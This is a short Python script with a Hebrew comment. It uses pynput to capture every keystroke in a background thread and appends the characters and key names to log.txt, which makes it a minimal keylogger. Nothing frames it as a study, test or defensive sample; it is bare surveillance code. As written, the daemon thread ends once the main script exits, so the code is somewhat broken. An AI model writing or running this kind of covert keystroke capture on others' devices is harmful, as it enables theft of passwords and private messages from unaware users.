import threading
from pynput.keyboard import Listener

def log_keys():
    def on_press(key):
        with open("log.txt", "a") as f:
            try:
                f.write(f"{key.char}")
            except AttributeError:
                f.write(f"[{key}]")

    with Listener(on_press=on_press) as listener:
        listener.join()

# הרצת הקוד כסקריפט רקע
threading.Thread(target=log_keys, daemon=True).start()





